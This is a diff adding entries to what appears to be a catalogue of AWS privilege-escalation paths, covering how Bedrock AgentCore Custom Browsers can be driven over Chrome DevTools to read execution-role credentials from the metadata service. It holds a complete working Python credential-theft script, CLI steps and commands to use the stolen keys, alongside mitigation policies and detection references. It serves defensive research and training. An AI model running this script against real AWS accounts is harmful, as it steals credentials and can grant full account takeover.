+      "nodes": [
+        {
+          "id": "start",
+          "label": "Starting Principal",
+          "type": "principal",
+          "description": "The principal with iam:PassRole and the bedrock-agentcore browser create, session and automation permissions. Can be an IAM user or role. This is the attacker's initial access point."
+        },
+        {
+          "id": "browser",
+          "label": "New Custom Browser",
+          "type": "resource",
+          "description": "A new AgentCore Custom Browser created with a privileged execution role. The browser is a managed Chromium runtime on a Firecracker microVM that exposes the role credentials on the MicroVM Metadata Service (MMDS) at 169.254.169.254, AgentCore's equivalent of EC2's IMDS."
+        },
+        {
+          "id": "target_role",
+          "label": "Existing Role That Trusts the bedrock-agentcore Service",
+          "type": "principal",
+          "description": "The IAM role passed to the browser as its execution role. The role must trust bedrock-agentcore.amazonaws.com to assume it. AgentCore assumes the role and serves its temporary credentials under the role's name on the MMDS security-credentials endpoint inside the browser microVM."
+        },
+        {
+          "id": "cdp_read",
+          "label": "CDP-driven MMDS read",
+          "type": "payload",
+          "color": "#99ccff",
+          "description": "The attacker waits for the browser to reach READY, starts a session, and reads the real automation WebSocket endpoint directly from the API response rather than guessing at it. The attacker signs the CDP connection with header-based SigV4 authentication and connects a CDP client such as Playwright, then installs a context.route hook that operates one layer below the page. A direct in-page request is blocked because browsers refuse cross-origin PUT requests and MMDS does not opt in, so the hook rewrites the token request from GET to PUT and injects the MMDSv2 token header on subsequent requests. The driver first requests the security-credentials index to discover the execution role's name, then navigates to that role's credentials endpoint and reads the role credentials out of the page.\n\nKey part of the driver:\n```python\ndef rewrite(route):\n    if \"/latest/api/token\" in route.request.url:\n        route.continue_(method=\"PUT\", headers={\"X-aws-ec2-metadata-token-ttl-seconds\": \"60\"})\n    else:\n        route.continue_(headers={\"X-aws-ec2-metadata-token\": token[\"value\"]})\n\npage.context.route(\"http://169.254.169.254/**\", rewrite)\npage.goto(\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\")\nrole_name = page.locator(\"pre\").text_content().strip()\npage.goto(f\"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}\")\n```\n"
+        },
+        {
+          "id": "admin",
+          "label": "Effective Administrator",
+          "type": "outcome",
+          "description": "The execution role has AdministratorAccess or equivalent permissions, so the credentials read out of the browser give the attacker full administrative access to the AWS account."
+        },
+        {
+          "id": "some_perms",
+          "label": "Some additional access",
+          "type": "outcome",
+          "color": "#ffeb99",
+          "description": "The execution role has some elevated permissions but not full admin. This could provide data access (S3, RDS, DynamoDB) or enable additional privilege escalation paths. The attacker should enumerate the role permissions to determine what was gained."
+        },
+        {
+          "id": "no_access",
+          "label": "No additional access",
+          "type": "outcome",
+          "color": "#cccccc",
+          "description": "The execution role only has minimal permissions (e.g., logs:PutLogEvents). Limited usefulness for privilege escalation, and the attacker would pass a different role."
+        }
+      ],
+      "edges": [
+        {
+          "from": "start",
+          "to": "browser",
+          "label": "iam:PassRole + bedrock-agentcore:CreateBrowser",
+          "description": "Create a new Custom Browser and pass the target role to it as the execution role. The browser runs Chromium on a Firecracker microVM with access to MMDS.\n\nCommand:\n```bash\naws bedrock-agentcore-control create-browser \\\n  --name atk_browser \\\n  --execution-role-arn $EXECUTION_ROLE \\\n  --network-configuration '{\"networkMode\":\"PUBLIC\"}'\n```\n"
+        },
+        {
+          "from": "browser",
+          "to": "target_role",
+          "label": "Browser assumes the execution role",
+          "description": "AgentCore assumes the passed execution role and, once the browser reaches READY, serves its temporary credentials on the MicroVM Metadata Service at http://169.254.169.254/latest/meta-data/iam/security-credentials/ inside the browser microVM."
+        },
+        {
+          "from": "target_role",
+          "to": "cdp_read",
+          "label": "bedrock-agentcore:StartBrowserSession + bedrock-agentcore:ConnectBrowserAutomationStream",
+          "description": "The attacker starts a browser session, reads the real automation WebSocket endpoint from the API response, signs the CDP connection with header-based SigV4 auth and connects a CDP driver that rewrites the browser outbound requests to discover the execution role's name and read its credentials from MMDS."
+        },
+        {
+          "from": "cdp_read",
+          "to": "admin",
+          "label": "If the execution role has admin permissions",
+          "branch": "A",
+          "condition": "admin",
+          "description": "If the execution role has AdministratorAccess or equivalent, the credentials read out of the browser give the attacker full administrative access to the AWS account from any location."
+        },
+        {
+          "from": "cdp_read",
+          "to": "some_perms",
+          "label": "If the execution role has some elevated permissions",
+          "branch": "B",
+          "condition": "some_permissions",
+          "description": "If the execution role has some elevated permissions, the stolen credentials can be used for lateral movement or additional attacks."
+        },
+        {
+          "from": "cdp_read",
+          "to": "no_access",
+          "label": "If the execution role has minimal permissions",
+          "branch": "C",
+          "condition": "no_permissions",
+          "description": "If the execution role only has minimal permissions, the stolen credentials provide limited value for privilege escalation."
+        }
+      ]
+    },
+    "gitMetadata": {
+      "created": "2026-06-15T19:04:36Z",
+      "lastUpdated": "2026-08-24T13:22:24Z",
+      "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
+        {
+          "name": "MrCloudSec",
+          "email": "sgarcia@beyondtrust.com",
+          "githubUsername": "MrCloudSec"
+        }
+      ]
+    },
+    "filePath": "data/paths/bedrock/bedrock-006.yaml"
+  },
+  {
+    "id": "bedrock-007",
+    "name": "bedrock-agentcore:StartBrowserSession + bedrock-agentcore:ConnectBrowserAutomationStream",
+    "category": "existing-passrole",
+    "services": [
+      "bedrock-agentcore"
+    ],
+    "description": "A principal with `bedrock-agentcore:StartBrowserSession` and `bedrock-agentcore:ConnectBrowserAutomationStream` can access an existing AgentCore Custom Browser that has a privileged IAM execution role attached and drive it over Chrome DevTools Protocol (CDP) to read the execution role credentials from the MicroVM Metadata Service (MMDS) at 169.254.169.254. This path does not require `iam:PassRole` because the role is already attached to the existing browser. The `start-browser-session` response returns the real automation WebSocket endpoint directly, so the attacker signs the CDP connection with header-based SigV4 authentication (not a presigned query string) and connects with a CDP client such as Playwright. It then installs a request hook that rewrites the MMDS token request from GET to PUT and injects the token header, discovers the execution role's name from the MMDS security-credentials index, and navigates to that role's credentials endpoint to read the response. The execution role is optional at browser creation, so only browsers created with a role attached are affected.",
+    "prerequisites": {
+      "admin": [
+        "An AgentCore Custom Browser must exist with an IAM execution role attached",
+        "The browser execution role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)"
+      ],
+      "lateral": [
+        "An AgentCore Custom Browser must exist with an IAM execution role attached"
+      ]
+    },
+    "exploitationSteps": {
+      "awscli": [
+        {
+          "step": 1,
+          "command": "export AWS_REGION=[your region]\npip install playwright boto3 && playwright install chromium\n",
+          "description": "Set up session variables and install the Playwright CDP client used as the automation driver"
+        },
+        {
+          "step": 2,
+          "command": "aws bedrock-agentcore-control list-browsers\naws bedrock-agentcore-control get-browser --browser-id BROWSER_ID\n",
+          "description": "List existing Custom Browsers and confirm the target has a privileged execution role attached and is in READY state before starting a session against it"
+        },
+        {
+          "step": 3,
+          "command": "cat << 'EOF' > \"get_creds_from_browser.py\"\nimport boto3, sys\nfrom urllib.parse import urlparse\nfrom botocore.auth import SigV4Auth\nfrom botocore.awsrequest import AWSRequest\nfrom botocore.credentials import Credentials\nfrom playwright.sync_api import sync_playwright\n\nBROWSER_ID = sys.argv[1]\nREGION = sys.argv[2]\n\nclient = boto3.client(\"bedrock-agentcore\", region_name=REGION)\nsession = client.start_browser_session(browserIdentifier=BROWSER_ID, sessionTimeoutSeconds=300)\nws_url = session[\"streams\"][\"automationStream\"][\"streamEndpoint\"]\n\ncreds = Credentials(*boto3.Session().get_credentials().get_frozen_credentials())\nrequest = AWSRequest(method=\"GET\", url=ws_url.replace(\"wss://\", \"https://\"), headers={\"host\": urlparse(ws_url).hostname})\nSigV4Auth(creds, \"bedrock-agentcore\", REGION).add_auth(request)\n\nwith sync_playwright() as p:\n    browser = p.chromium.connect_over_cdp(ws_url, headers=dict(request.headers))\n    page = browser.contexts[0].pages[0]\n    token = {\"value\": \"\"}\n\n    def rewrite(route):\n        if \"/latest/api/token\" in route.request.url:\n            route.continue_(method=\"PUT\", headers={\"X-aws-ec2-metadata-token-ttl-seconds\": \"60\"})\n        else:\n            route.continue_(headers={\"X-aws-ec2-metadata-token\": token[\"value\"]})\n\n    page.context.route(\"http://169.254.169.254/**\", rewrite)\n\n    page.goto(\"http://169.254.169.254/latest/api/token\")\n    token[\"value\"] = page.locator(\"pre\").text_content().strip()\n    page.goto(\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\")\n    role_name = page.locator(\"pre\").text_content().strip()\n    page.goto(f\"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}\")\n    print(page.locator(\"pre\").text_content())\nEOF\n",
+          "description": "Create the python file that reads the CDP WebSocket endpoint from the start_browser_session response, connects over CDP using header-based SigV4 auth, discovers the execution role's name from the MMDS security-credentials index, then reads its credentials via a context.route hook that rewrites GET to PUT and injects the MMDSv2 token header"
+        },
+        {
+          "step": 4,
+          "command": "python3 get_creds_from_browser.py $BROWSER_ID $AWS_REGION",
+          "description": "Run the driver against the existing browser to print the execution role credentials"
+        },
+        {
+          "step": 5,
+          "command": "export AWS_ACCESS_KEY_ID=<AccessKeyId from step 4>\nexport AWS_SECRET_ACCESS_KEY=<SecretAccessKey from step 4>\nexport AWS_SESSION_TOKEN=<Token from step 4>\naws sts get-caller-identity\n",
+          "description": "Use the stolen credentials to act as the browser execution role"
+        }
+      ]
+    },
+    "recommendation": "Restrict the `bedrock-agentcore:StartBrowserSession` and `bedrock-agentcore:ConnectBrowserAutomationStream` permissions using resource-level constraints.\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": [\n    \"bedrock-agentcore:StartBrowserSession\",\n    \"bedrock-agentcore:ConnectBrowserAutomationStream\"\n  ],\n  \"Resource\": \"arn:aws:bedrock-agentcore:REGION:ACCOUNT_ID:browser/SpecificBrowser\"\n}\n```\n\nAdditional controls:\n- Create Custom Browsers without an execution role when the workload does not need AWS API access from inside the sandbox; a role-less browser has no credentials to leak on MMDS\n- Review and minimize execution role permissions on existing browsers, and remove the role entirely where it is not used\n- Enable CloudTrail data events for the `AWS::BedrockAgentCore::BrowserCustom` resource type to capture session starts and automation stream connections\n- Custom Browser only exposes session-metadata usage logs; the MMDS read inside the automation stream is not visible to AWS, so role scoping and access restriction matter more than detection here\n- Anyone with view access on the browser can observe whatever the driver navigates to in the live session view, so restrict that access as well\n- Regularly audit execution roles attached to existing browsers and the principals that can start sessions on them\n",
+    "limitations": "This path provides administrative access only if the target browser execution role has administrative permissions. The attacker gains whatever permissions the browser role has. If the role has limited permissions, the attacker gains limited access. However, even limited access may enable multi-hop attacks or access to sensitive data.\n",
+    "discoveryAttribution": {
+      "firstDocumented": {
+        "author": "Sergio Garcia",
+        "organization": "BeyondTrust Phantom Labs",
+        "date": 2026,
+        "link": "https://www.beyondtrust.com/blog/entry/aws-agentcore-privilege-escalation"
+      },
+      "derivativeOf": {
+        "pathId": "bedrock-006",
+        "modification": "Targets an existing Custom Browser instead of creating one, eliminating the need for iam:PassRole and bedrock-agentcore:CreateBrowser; the CDP-driven MMDS read is identical"
+      }
+    },
+    "references": [
+      {
+        "title": "Mapping Every Privilege Escalation Path in AWS AgentCore",
+        "url": "https://www.beyondtrust.com/blog/entry/aws-agentcore-privilege-escalation"
+      },
+      {
+        "title": "Understanding Credentials Management in Amazon Bedrock AgentCore",
+        "url": "https://docs.aws.amazon.com/bedrock-agentcore/latest/devguide/security-credentials-management.html"
+      },
+      {
+        "title": "Amazon Bedrock AgentCore Browser tool",
+        "url": "https://docs.aws.amazon.com/bedrock-agentcore/latest/devguide/browser-tool.html"
+      }
+    ],
+    "relatedPaths": [
+      "bedrock-002",
+      "bedrock-004",
+      "bedrock-006",
+      "ec2-002"
+    ],
+    "learningEnvironments": {
+      "pathfinding-labs": {
+        "type": "open-source",
+        "githubLink": "https://github.com/DataDog/pathfinding-labs",
+        "scenario": "privesc-one-hop/to-admin/bedrockagentcore-startbrowsersession+cdp",
+        "description": "Deploy Terraform into your own AWS account to practice this attack path"
+      }
+    },
+    "permissions": {
+      "required": [
+        {
+          "permission": "bedrock-agentcore:StartBrowserSession",
+          "resourceConstraints": "Must have permission to start sessions on the target browser; can be scoped to a specific browser ARN or granted on wildcard"
+        },
+        {
+          "permission": "bedrock-agentcore:ConnectBrowserAutomationStream",
+          "resourceConstraints": "Must have permission to connect the CDP automation stream to the target browser; can be scoped to a specific browser ARN or granted on wildcard"
+        }
+      ],
+      "additional": [
+        {
+          "permission": "bedrock-agentcore:ListBrowsers",
+          "resourceConstraints": "List the Custom Browsers that already exist"
+        },
+        {
+          "permission": "bedrock-agentcore:GetBrowser",
+          "resourceConstraints": "Identify the execution role attached to a target browser"
+        }
+      ]
+    },
+    "detectionTools": {
+      "prowler": "https://github.com/prowler-cloud/prowler/blob/1e1c1c018b6466b416e8cc98a452b11d4b83ae07/prowler/providers/aws/services/iam/lib/privilege_escalation.py#L335"
+    },
+    "attackVisualization": {
+      "nodes": [
+        {
+          "id": "start",
+          "label": "Starting Principal",
+          "type": "principal",
+          "description": "The principal with bedrock-agentcore:StartBrowserSession and bedrock-agentcore:ConnectBrowserAutomationStream. Can be an IAM user or role. This attack targets an existing browser rather than creating one, so iam:PassRole is not required."
+        },
+        {
+          "id": "browser",
+          "label": "Existing Custom Browser",
+          "type": "resource",
+          "description": "An existing AgentCore Custom Browser with a privileged execution role already attached. The browser is a managed Chromium runtime on a Firecracker microVM with access to the MicroVM Metadata Service (MMDS) at 169.254.169.254, AgentCore's equivalent of EC2's IMDS."
+        },
+        {
+          "id": "execution_role",
+          "label": "Browser Execution Role",
+          "type": "principal",
+          "description": "The IAM role attached to the browser as its execution role. AgentCore serves this role's temporary credentials on MMDS at the execution_role endpoint inside the browser microVM. This role must trust bedrock-agentcore.amazonaws.com in its trust policy."
+        },
+        {
+          "id": "cdp_read",
+          "label": "CDP-driven MMDS read",
+          "type": "payload",
+          "color": "#99ccff",
+          "description": "The `start-browser-session` response returns the real automation WebSocket endpoint directly, so the attacker signs the CDP connection with header-based SigV4 auth and connects a CDP client such as Playwright, then installs a context.route hook that operates one layer below the page. A direct in-page request is blocked because browsers refuse cross-origin PUT requests and MMDS does not opt in, so the hook rewrites the token request from GET to PUT and injects the MMDSv2 token header on subsequent requests. The driver then reads the execution role's name from the MMDS security-credentials index before navigating to that role's credentials endpoint and reading the response out of the page.\n\nKey part of the driver:\n```python\ndef rewrite(route):\n    if \"/latest/api/token\" in route.request.url:\n        route.continue_(method=\"PUT\", headers={\"X-aws-ec2-metadata-token-ttl-seconds\": \"60\"})\n    else:\n        route.continue_(headers={\"X-aws-ec2-metadata-token\": token[\"value\"]})\n\npage.context.route(\"http://169.254.169.254/**\", rewrite)\npage.goto(\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\")\nrole_name = page.locator(\"pre\").text_content().strip()\npage.goto(f\"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}\")\n```\n"
+        },
+        {
+          "id": "admin",
+          "label": "Effective Administrator",
+          "type": "outcome",
+          "description": "The browser execution role has AdministratorAccess or equivalent permissions, so the credentials read out of the browser give the attacker full administrative access to the AWS account."
+        },
+        {
+          "id": "some_perms",
+          "label": "Some additional access",
+          "type": "outcome",
+          "color": "#ffeb99",
+          "description": "The execution role has some elevated permissions but not full admin. This could provide data access (S3, RDS, DynamoDB) or enable additional privilege escalation paths. The attacker should enumerate the role permissions to determine what was gained."
+        },
+        {
+          "id": "no_access",
+          "label": "No additional access",
+          "type": "outcome",
+          "color": "#cccccc",
+          "description": "The execution role only has minimal permissions (e.g., logs:PutLogEvents). Limited usefulness for privilege escalation, and the attacker would target a different browser."
+        }
+      ],
+      "edges": [
+        {
+          "from": "start",
+          "to": "browser",
+          "label": "Target existing Custom Browser",
+          "description": "Identify an existing Custom Browser that has a privileged execution role attached. Use the list and get control-plane calls to discover candidates and confirm their execution role and READY status before starting a session against one.\n\nCommands:\n```bash\naws bedrock-agentcore-control list-browsers\naws bedrock-agentcore-control get-browser --browser-id BROWSER_ID\n```\n"
+        },
+        {
+          "from": "browser",
+          "to": "execution_role",
+          "label": "bedrock-agentcore:StartBrowserSession + bedrock-agentcore:ConnectBrowserAutomationStream",
+          "description": "The attacker starts a browser session and reads the automation WebSocket endpoint directly from the response, then connects a CDP driver to the existing browser using header-based SigV4 auth. The driver has a path to the execution role credentials on MMDS inside the microVM."
+        },
+        {
+          "from": "execution_role",
+          "to": "cdp_read",
+          "label": "Drive the browser over CDP to read MMDS",
+          "description": "The attacker installs the context.route hook and navigates the browser to the MMDS endpoints, reading the role credentials out of the page."
+        },
+        {
+          "from": "cdp_read",
+          "to": "admin",
+          "label": "If the execution role has admin permissions",
+          "branch": "A",
+          "condition": "admin",
+          "description": "If the execution role has AdministratorAccess or equivalent, the credentials read out of the browser give the attacker full administrative access to the AWS account from any location."
+        },
+        {
+          "from": "cdp_read",
+          "to": "some_perms",
+          "label": "If the execution role has some elevated permissions",
+          "branch": "B",
+          "condition": "some_permissions",
+          "description": "If the execution role has some elevated permissions, the stolen credentials can be used for lateral movement or additional attacks."
+        },
+        {
+          "from": "cdp_read",
+          "to": "no_access",
+          "label": "If the execution role has minimal permissions",
+          "branch": "C",
+          "condition": "no_permissions",
+          "description": "If the execution role only has minimal permissions, the stolen credentials provide limited value for privilege escalation."
+        }
+      ]
+    },
+    "gitMetadata": {
+      "created": "2026-06-15T19:04:36Z",
+      "lastUpdated": "2026-08-24T13:22:24Z",
+      "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
+        {
+          "name": "MrCloudSec",
+          "email": "sgarcia@beyondtrust.com",
+          "githubUsername": "MrCloudSec"
+        }
+      ]
+    },
+    "filePath": "data/paths/bedrock/bedrock-007.yaml"
   },
   {
     "id": "braket-001",
